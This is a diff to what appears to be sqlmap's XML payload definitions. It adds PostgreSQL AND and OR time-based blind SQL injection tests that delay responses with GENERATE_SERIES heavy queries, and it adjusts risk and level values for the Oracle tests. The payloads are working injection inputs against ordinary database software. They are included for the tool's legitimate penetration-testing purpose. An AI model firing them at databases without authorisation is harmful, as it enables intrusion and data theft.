@@ -1463,7 +1463,7 @@ Formats:
         <title>Oracle AND time-based blind</title>
         <stype>5</stype>
         <level>1</level>
-        <risk>2</risk>
+        <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
         <request>
@@ -1480,7 +1480,7 @@ Formats:
     <test>
         <title>Oracle AND time-based blind (heavy query)</title>
         <stype>5</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
@@ -1492,6 +1492,24 @@ Formats:
         </response>
         <details>
             <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
         </details>
     </test>
 
@@ -1552,10 +1570,6 @@ Formats:
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-    <!--
-         NOTE: there is no way to perform this test against Microsoft SQL
-         Server, Sybase, Oracle or PostgreSQL
-    -->
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of AND time-based blind tests -->
 
@@ -1635,7 +1649,25 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
-    
+
+    <test>
+        <title>PostgreSQL OR time-based blind</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <request>
+            <payload>OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
     <test>
         <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
         <stype>5</stype>
@@ -1693,10 +1725,6 @@ Formats:
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-    <!--
-         NOTE: there is no way to perform this test against Microsoft SQL
-         Server, Sybase, Oracle or PostgreSQL
-    -->
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
     <!-- End of OR time-based blind tests -->
 
